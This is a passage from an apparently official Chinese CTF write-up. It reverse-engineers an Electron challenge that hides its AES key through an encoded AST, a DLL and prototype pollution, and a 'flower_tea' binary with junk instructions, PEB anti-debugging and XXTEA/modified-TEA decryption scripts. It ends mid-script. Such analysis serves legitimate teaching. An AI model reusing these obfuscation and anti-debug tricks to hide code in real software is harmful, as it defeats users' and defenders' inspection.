6eyJ0eXBlIjoiTWVtYmVyRXhwcmVzc2lvbiIsInN0YXJ0Ijo1MSwiZW5kIjo2MSwib2JqZWN0Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjUxLCJlbmQiOjU2LCJuYW1lIjoia29mZmkifSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6NTcsImVuZCI6NjEsIm5hbWUiOiJsb2FkIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwiYXJndW1lbnRzIjpbeyJ0eXBlIjoiTGl0ZXJhbCIsInN0YXJ0Ijo2MiwiZW5kIjo3MywidmFsdWUiOiJteWRsbC5kbGwiLCJyYXciOiJcIm15ZGxsLmRsbFwiIn1dLCJvcHRpb25hbCI6ZmFsc2V9fV0sImtpbmQiOiJjb25zdCJ9LHsidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRpb24iLCJzdGFydCI6NzgsImVuZCI6MTI2LCJkZWNsYXJhdGlvbnMiOlt7InR5cGUiOiJWYXJpYWJsZURlY2xhcmF0b3IiLCJzdGFydCI6ODQsImVuZCI6MTI2LCJpZCI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0Ijo4NCwiZW5kIjo4OCwibmFtZSI6ImZ1bmMifSwiaW5pdCI6eyJ0eXBlIjoiQ2FsbEV4cHJlc3Npb24iLCJzdGFydCI6ODksImVuZCI6MTI2LCJjYWxsZWUiOnsidHlwZSI6Ik1lbWJlckV4cHJlc3Npb24iLCJzdGFydCI6ODksImVuZCI6OTcsIm9iamVjdCI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0Ijo4OSwiZW5kIjo5MiwibmFtZSI6ImxpYiJ9LCJwcm9wZXJ0eSI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0Ijo5MywiZW5kIjo5NywibmFtZSI6ImZ1bmMifSwiY29tcHV0ZWQiOmZhbHNlLCJvcHRpb25hbCI6ZmFsc2V9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjk4LCJlbmQiOjEyNSwidmFsdWUiOiJjaGFyKiBPdXRwdXQoY2hhciogaW5wdXQpIiwicmF3IjoiXCJjaGFyKiBPdXRwdXQoY2hhciogaW5wdXQpXCIifV0sIm9wdGlvbmFsIjpmYWxzZX19XSwia2luZCI6ImNvbnN0In0seyJ0eXBlIjoiRXhwcmVzc2lvblN0YXRlbWVudCIsInN0YXJ0IjoxMzAsImVuZCI6MTM2LCJleHByZXNzaW9uIjp7InR5cGUiOiJBc3NpZ25tZW50RXhwcmVzc2lvbiIsInN0YXJ0IjoxMzAsImVuZCI6MTM2LCJvcGVyYXRvciI6Ij0iLCJsZWZ0Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjEzMCwiZW5kIjoxMzMsIm5hbWUiOiJ0bXAifSwicmlnaHQiOnsidHlwZSI6Ik9iamVjdEV4cHJlc3Npb24iLCJzdGFydCI6MTM0LCJlbmQiOjEzNiwicHJvcGVydGllcyI6W119fX0seyJ0eXBlIjoiRXhwcmVzc2lvblN0YXRlbWVudCIsInN0YXJ0IjoxNDAsImVuZCI6MjM4LCJleHByZXNzaW9uIjp7InR5cGUiOiJBc3NpZ25tZW50RXhwcmVzc2lvbiIsInN0YXJ0IjoxNDAsImVuZCI6MjM4LCJvcGVyYXRvciI6Ij0iLCJsZWZ0Ijp7InR5cGUiOiJNZW1iZXJFeHByZXNzaW9uIiwic3RhcnQiOjE0MCwiZW5kIjoxNjIsIm9iamVjdCI6eyJ0eXBlIjoiTWVtYmVyRXhwcmVzc2lvbiIsInN0YXJ0IjoxNDAsImVuZCI6MTUzLCJvYmplY3QiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MTQwLCJlbmQiOjE0MywibmFtZSI6InRtcCJ9LCJwcm9wZXJ0eSI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0IjoxNDQsImVuZCI6MTUzLCJuYW1lIjoiX19wcm90b19fIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MTU0LCJlbmQiOjE2MiwibmFtZSI6InRvU3RyaW5nIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwicmlnaHQiOnsidHlwZSI6IkFycm93RnVuY3Rpb25FeHByZXNzaW9uIiwic3RhcnQiOjE2MywiZW5kIjoyMzgsImlkIjpudWxsLCJleHByZXNzaW9uIjpmYWxzZSwiZ2VuZXJhdG9yIjpmYWxzZSwiYXN5bmMiOmZhbHNlLCJwYXJhbXMiOltdLCJib2R5Ijp7InR5cGUiOiJCbG9ja1N0YXRlbWVudCIsInN0YXJ0IjoxNjcsImVuZCI6MjM4LCJib2R5IjpbeyJ0eXBlIjoiUmV0dXJuU3RhdGVtZW50Iiwic3RhcnQiOjE2OCwiZW5kIjoyMzcsImFyZ3VtZW50Ijp7InR5cGUiOiJDYWxsRXhwcmVzc2lvbiIsInN0YXJ0IjoxNzUsImVuZCI6MjM3LCJjYWxsZWUiOnsidHlwZSI6Ik1lbWJlckV4cHJlc3Npb24iLCJzdGFydCI6MTc1LCJlbmQiOjIzMSwib2JqZWN0Ijp7InR5cGUiOiJBcnJheUV4cHJlc3Npb24iLCJzdGFydCI6MTc1LCJlbmQiOjIyNSwiZWxlbWVudHMiOlt7InR5cGUiOiJTcHJlYWRFbGVtZW50Iiwic3RhcnQiOjE3NiwiZW5kIjoyMjQsImFyZ3VtZW50Ijp7InR5cGUiOiJDYWxsRXhwcmVzc2lvbiIsInN0YXJ0IjoxNzksImVuZCI6MjI0LCJjYWxsZWUiOnsidHlwZSI6Ik1lbWJlckV4cHJlc3Npb24iLCJzdGFydCI6MTc5LCJlbmQiOjE4OSwib2JqZWN0Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjE3OSwiZW5kIjoxODMsIm5hbWUiOiJKU09OIn0sInByb3BlcnR5Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjE4NCwiZW5kIjoxODksIm5hbWUiOiJwYXJzZSJ9LCJjb21wdXRlZCI6ZmFsc2UsIm9wdGlvbmFsIjpmYWxzZX0sImFyZ3VtZW50cyI6W3sidHlwZSI6IkNhbGxFeHByZXNzaW9uIiwic3RhcnQiOjE5MCwiZW5kIjoyMjMsImNhbGxlZSI6eyJ0eXBlIjoiTWVtYmVyRXhwcmVzc2lvbiIsInN0YXJ0IjoxOTAsImVuZCI6MjEyLCJvYmplY3QiOnsidHlwZSI6IkNhbGxFeHByZXNzaW9uIiwic3RhcnQiOjE5MCwiZW5kIjoyMDQsImNhbGxlZSI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0IjoxOTAsImVuZCI6MTk0LCJuYW1lIjoiZnVuYyJ9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjE5NSwiZW5kIjoyMDMsInZhbHVlIjoiZmFrZX5+IiwicmF3IjoiXCJmYWtlfn5cIiJ9XSwib3B0aW9uYWwiOmZhbHNlfSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MjA1LCJlbmQiOjIxMiwibmFtZSI6InJlcGxhY2UifSwiY29tcHV0ZWQiOmZhbHNlLCJvcHRpb25hbCI6ZmFsc2V9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjIxMywiZW5kIjoyMTcsInZhbHVlIjp7fSwicmF3IjoiLyAvZyIsInJlZ2V4Ijp7InBhdHRlcm4iOiIgIiwiZmxhZ3MiOiJnIn19LHsidHlwZSI6IkxpdGVyYWwiLCJzdGFydCI6MjE5LCJlbmQiOjIyMiwidmFsdWUiOiIsIiwicmF3IjoiJywnIn1dLCJvcHRpb25hbCI6ZmFsc2V9XSwib3B0aW9uYWwiOmZhbHNlfX1dfSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MjI2LCJlbmQiOjIzMSwibmFtZSI6InNsaWNlIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwiYXJndW1lbnRzIjpbeyJ0eXBlIjoiTGl0ZXJhbCIsInN0YXJ0IjoyMzIsImVuZCI6MjMzLCJ2YWx1ZSI6MCwicmF3IjoiMCJ9LHsidHlwZSI6IkxpdGVyYWwiLCJzdGFydCI6MjM0LCJlbmQiOjIzNiwidmFsdWUiOjE2LCJyYXciOiIxNiJ9XSwib3B0aW9uYWwiOmZhbHNlfX1dfX19fV19fX1dLCJzb3VyY2VUeXBlIjoic2NyaXB0In0=&#x27;,&#x27;base64&#x27;).toString())))</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() =&gt; &#123;</span><br><span class="line">    const koffi = require(&#x27;koffi&#x27;);//一个普通的loadlibrary</span><br><span class="line">    const lib = koffi.load(&#x27;mydll.dll&#x27;);</span><br><span class="line">    const func = lib.func(&#x27;char* Output(char* input)&#x27;);</span><br><span class="line">    tmp = &#123;&#125;;</span><br><span class="line">    tmp.__proto__.toString = () =&gt; &#123;</span><br><span class="line">        return [...JSON.parse(func(&#x27;fake~~&#x27;).replace(/ /g, &#x27;,&#x27;))].slice(0, 16);//一个普通的原型链污染</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后分析dll(根目录下的mydll.dll)<br>对应的Output函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822488-d9615fb7-f1bf-49a1-9907-8688482c07bb.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// main.Output</span><br><span class="line">__int8 *__golang main_Output(__int8 *input)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // r14</span><br><span class="line">  __int128 v2; // xmm15</span><br><span class="line">  void *v3; // rax</span><br><span class="line">  retval_3AE7B1440 v; // [rsp+24h] [rbp-69Ch] BYREF</span><br><span class="line">  _OWORD a[104]; // [rsp+38h] [rbp-688h] BYREF</span><br><span class="line">  string v7; // 0:rax.8,8:rbx.8</span><br><span class="line">  _slice_interface_ v8; // 0:rax.8,8:rbx.8,16:rcx.8</span><br><span class="line"></span><br><span class="line">  if ( (unsigned __int64)&amp;a[4] + 8 &lt;= *(_QWORD *)(v1 + 16) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(0x3AE7B257ALL);</span><br><span class="line">  &#125;</span><br><span class="line">  memset(&amp;a[1], 0, 0x670uLL);</span><br><span class="line">  *(_QWORD *)&amp;a[1] = &quot;Dragon Knight&quot;;</span><br><span class="line">  *((_QWORD *)&amp;a[1] + 1) = 13LL;</span><br><span class="line">  main_sha1PadMessage((main_SHA1Context *)&amp;a[1]);</span><br><span class="line">  main_sha1ProcessMessageBlock((main_SHA1Context *)&amp;a[1]);</span><br><span class="line">  v = main_sha1_digest((main_SHA1Context *)&amp;a[1]);</span><br><span class="line">  a[0] = v2;</span><br><span class="line">  v3 = runtime_convTnoptr((runtime__type *)&amp;RTYPE__20_uint8, &amp;v);</span><br><span class="line">  *(_QWORD *)&amp;a[0] = &amp;RTYPE__20_uint8;</span><br><span class="line">  *((_QWORD *)&amp;a[0] + 1) = v3;</span><br><span class="line">  v8.array = (interface_ *)a;</span><br><span class="line">  v8.len = 1LL;</span><br><span class="line">  v8.cap = 1LL;</span><br><span class="line">  v7 = fmt_Sprintln(v8);</span><br><span class="line">  return main__Cfunc_CString(v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上是个固定输出的sha1，sha1的输入为”Dragon Knight”<br>输出即为0f0d105e8ec0eb28e43dfff700c32fe145949c5c(实际是个字节数组),同时通过slice取的其前16字节污染Object原型的toString元素<br>通过<code>toString(&quot;never gonna give you up&quot;)</code>将被污染的<code>0f0d105e8ec0eb28e43dfff700c32fe1</code>发送给index.js<br>再看index.js<br>base64语句实际上就是这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(event, arg) =&gt; &#123;</span><br><span class="line">    c = CryptoJS.AES.encrypt(arg, k3y, &#123;</span><br><span class="line">        mode: CryptoJS.mode.ECB,</span><br><span class="line">        padding: CryptoJS.pad.ZeroPadding</span><br><span class="line">    &#125;);</span><br><span class="line">    if (c.toString() == &#x27;wPUqm+0VU9uX0knpKIWxFilCSO6tae50LTUi0U41Tag=&#x27;) &#123;</span><br><span class="line">        dialog.showMessageBox(&#123;</span><br><span class="line">            title: &#x27;正确\uFF01&#x27;,</span><br><span class="line">            message: &#x27;right!&#x27;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dialog.showMessageBox(&#123;</span><br><span class="line">            title: &#x27;错误\uFF01&#x27;,</span><br><span class="line">            message: &#x27;NO!!!!!&#x27;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>密文就是<code>wPUqm+0VU9uX0knpKIWxFilCSO6tae50LTUi0U41Tag=</code>而key就是<code>0f0d105e8ec0eb28e43dfff700c32fe1</code> 加密方式AES-ECB-NoPadding<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822326-61cd8a74-2de9-4855-8cbd-87116c4ff883.png" alt="image.png"><br>另一种做法<br>将app.asar的导出文件全部放在resources目录下的app目录(自己新建)<br>更改index.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipcMain.on(&#x27;k3y&#x27;,(event,argk)=&gt;&#123;</span><br><span class="line">    var k3y=CryptoJS.lib.WordArray.create(new Uint8Array(argk))</span><br><span class="line">        ipcMain.on(&#x27;flag&#x27;,(event,arg)=&gt;&#123;</span><br><span class="line">            func=(event, arg) =&gt; &#123;</span><br><span class="line">                dialog.showMessageBox(&#123;</span><br><span class="line">                    title:&quot;abc&quot;,</span><br><span class="line">                    message:CryptoJS.AES.decrypt(</span><br><span class="line">                    &#x27;wPUqm+0VU9uX0knpKIWxFilCSO6tae50LTUi0U41Tag=&#x27;,k3y,&#123;</span><br><span class="line">                    mode: CryptoJS.mode.ECB,</span><br><span class="line">                    padding: CryptoJS.pad.ZeroPadding</span><br><span class="line">                &#125;).toString(CryptoJS.enc.Utf8)&#125;)</span><br><span class="line">            &#125;; </span><br><span class="line">            func(event,arg); </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>也能达成直接爆flag的效果<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822274-764379f7-de53-4a02-9bbc-0339cc78f752.png" alt="image.png"></p>
<h3 id="flower-tea"><a href="#flower-tea" class="headerlink" title="flower_tea"></a><strong>flower_tea</strong></h3><p>考点：花指令去除，tea算法<br>观察main函数：<br>主函数的大概是这样。<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png" alt="image.png"><br>如果要调试，要先把第一个函数nop掉（实际上并不用）<br>这里先看encode函数，点开后是爆红的，所以先解花指令<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png" alt="image.png"><br>这个是一个简单的jmp花指令，把后面的jmp nop掉，然后可以看到第一部分。<br>这时最上面还是有标红<br>在汇编界面看看哪里还有花<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png" alt="image.png"><br>这里有一个奇怪的call：<br>逻辑是：call完之后把ret的值+0xC然后返回<br>把这一部分按u解除，在加0xC后的位置再反编译<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png" alt="image.png"><br>所以ret之后就会到pop的位置<br>把中间这一段全部nop，然后把整个函数u，然后c，再浏览一下函数，中间有一个怪jmp，删掉<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png" alt="image.png"><br>然后再p，得到解完花的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line">  int v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line">  int v5; // eax</span><br><span class="line">  int v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line">  int v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned int i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned int v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned int v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned int v12; // [rsp+40h] [rbp-20h]</span><br><span class="line">  int v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">      if ( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">    if ( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个的特征很明显是xxtea，并且没有魔改，网上直接搜脚本<br>exp：(需要用clang)<br>(网上的脚本<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#define DELTA 0x9e3779b9</span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, int n, uint32_t const key[4])</span><br><span class="line">&#123;</span><br><span class="line">	uint32_t y, z, sum;</span><br><span class="line">	unsigned p, rounds, e;</span><br><span class="line">	if (n &gt; 1)            /* Coding Part */</span><br><span class="line">	&#123;</span><br><span class="line">		rounds = 6 + 52 / n;</span><br><span class="line">		sum = 0;</span><br><span class="line">		z = v[n - 1];</span><br><span class="line">		do</span><br><span class="line">		&#123;</span><br><span class="line">			sum += DELTA;</span><br><span class="line">			e = (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">			for (p = 0; p &lt; n - 1; p++)</span><br><span class="line">			&#123;</span><br><span class="line">				y = v[p + 1];</span><br><span class="line">				z = v[p] += MX;</span><br><span class="line">			&#125;</span><br><span class="line">			y = v[0];</span><br><span class="line">			z = v[n - 1] += MX;</span><br><span class="line">		&#125; while (--rounds);</span><br><span class="line">	&#125;</span><br><span class="line">	else if (n &lt; -1)      /* Decoding Part */</span><br><span class="line">	&#123;</span><br><span class="line">		n = -n;</span><br><span class="line">		rounds = 6 + 52 / n;</span><br><span class="line">		sum = rounds * DELTA;</span><br><span class="line">		y = v[0];</span><br><span class="line">		do</span><br><span class="line">		&#123;</span><br><span class="line">			e = (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">			for (p = n - 1; p &gt; 0; p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p - 1];</span><br><span class="line">				y = v[p] -= MX;</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n - 1];</span><br><span class="line">			y = v[0] -= MX;</span><br><span class="line">			sum -= DELTA;</span><br><span class="line">		&#125; while (--rounds);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char fakefalg[99] = &#123; 0xff, 0xef, 0x79, 0xbc, 0xda, 0x6c, 0xc9,</span><br><span class="line">						0xb1, 0x24, 0x90, 0x89, 0x5d, 0x99,</span><br><span class="line">						0x42, 0xe1, 0x15, 0xc1, 0x1b, 0x2a,</span><br><span class="line">						0x5a, 0x9f, 0x90, 0xe0, 0x5f, 0xe9,</span><br><span class="line">						0x74, 0x9d, 0x44, 0x0d, 0x56, 0xfd,</span><br><span class="line">						0x51, 0x7e, 0x34, 0x5a, 0xc5, 0x3a,</span><br><span class="line">						0x5e, 0x24, 0xbc, 0xe1, 0x40, 0x0d,</span><br><span class="line">						0x17, 0x68, 0xfc, 0xcc, 0x09, 0x5b,</span><br><span class="line">						0xff, 0xc9, 0x45, 0x19, 0xb6, 0xc9,</span><br><span class="line">						0x0a, 0x5e, 0xd9, 0x03, 0xb2, 0x48 &#125;;</span><br><span class="line">	for (int i = 0; i &lt; 61; ++i) &#123;</span><br><span class="line">		fakefalg[i] ^= 0x23;</span><br><span class="line">	&#125;</span><br><span class="line">	uint32_t key[4] = &#123; 0x1234,0x2341,0x3412,0x4123 &#125;;</span><br><span class="line">	btea((unsigned*)(fakefalg + 1), -15, key);</span><br><span class="line">	printf(&quot;解密后的数据：%s\n&quot;, (char*)fakefalg);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到假flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There_is_no_more_flower_tea.Please_try_again!!&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，这个不是真flag，这说明：<br>动态调试的时候和正常的时候运行的逻辑不一样<br>第一时间会想到这个可能是smc或者hook<br>所以先查看encode的交叉引用。<br>于是找到这个函数：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png" alt="image.png"><br>可以看到上层函数<br>修改了encode中的前几个字节用ret的方法返回到sub_140012A0中<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png" alt="image.png"><br>这里的第一个是反调试，在x64下，调试标志位在PEB表偏移0x2的位置，通过获取gs寄存器找到peb表的位置：<br>readsqword(0x62)得到调试标志位并判断当前进程是否在调试<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png" alt="image.png"><br>block是单纯地得到对应的两个函数地址<br>get_virtual_protect中，通过异或把virtualprotect函数名隐藏并通过搜索它在kernel32.dll中位置返回函数地址<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png" alt="image.png"><br>通过上面的分析，可以得出我们需要查看sub_140012A0的内容，这里才是真正的加密函数<br>打开，还是花QAQ<br>汇编中，可以看到函数后段全是一个指令+一个jmp<br>由于汇编不是很好看，改成流程图看奇怪的地方。<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png" alt="image.png"><br>可以猜测：如果一个地方有一块代码，并且有连续jmp，这里可能是人工加的花<br>那么就先看一下那个很远的环和上面一排没有入口的块<br>1<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png" alt="image.png"><br>这里能看到push和pop，所以从push进入花，从pop离开花，可以看出可以这样还原<br>2<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png" alt="image.png"><br>这里有一个call，尝试跟着call走，它下一步修改了返回地址，减去5A<br>即：140001460<br>转换一下这里的指令<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png" alt="image.png"><br>所以把call nop了就好<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png" alt="image.png"><br>3<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png" alt="image.png"><br>nop之后<br>然后全部u，c，p还原函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png" alt="image.png"><br>这里又可以看到上面的一个奇怪return，看汇编可以发现还是一个花<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png" alt="image.png"><br>直接把call到retn去掉（除了shl）<br>这是一个变体tea，尝试化简这个函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png" alt="image.png"><br>写脚本直接解<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;stdarg.h&gt;</span><br><span class="line">#include&lt;stdint.h&gt; </span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void dectrueTEA(uint32_t* flag, uint32_t* key, uint32_t E) &#123;</span><br><span class="line">	int i, j;</span><br><span class="line">	const uint32_t delta[4] = &#123; 0x59578627 ,0xe1c49e72,0xbc24167f ,0x8c3da26b &#125;;</span><br><span class="line">	uint32_t e = E;</span><br><span class="line">	const int len = 15;</span><br><span class="line">	for (i = 0; i &lt; len; i += 4) &#123;</span><br><span class="line">		uint32_t* c[4] = &#123; &amp;flag[(len - (i + 3)) % len],&amp;flag[(len - (i + 2)) % len],&amp;flag[(len - (i + 1)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line">		for (j = 32; j &gt;= 0; j--) &#123;</span><br><span class="line">			*c[3] -= ((e ^ *c[2]) ^ (key[(j + 3) % 4] &gt;&gt; 2)) ^ (e &lt;&lt; 1);</span><br><span class="line">			e -= delta[*c[3] % 4];</span><br><span class="line"></span><br><span class="line">			*c[2] -= ((e ^ *c[1]) ^ (key[(j + 2) % 4] &lt;&lt; 3)) ^ (e &gt;&gt; 2);</span><br><span class="line">			e -= delta[*c[2] % 4];</span><br><span class="line"></span><br><span class="line">			*c[1] -= ((e ^ *c[0]) ^ (key[(j + 1) % 4] &gt;&gt; 1)) ^ (e &lt;&lt; 4);</span><br><span class="line">			e -= delta[*c[1] % 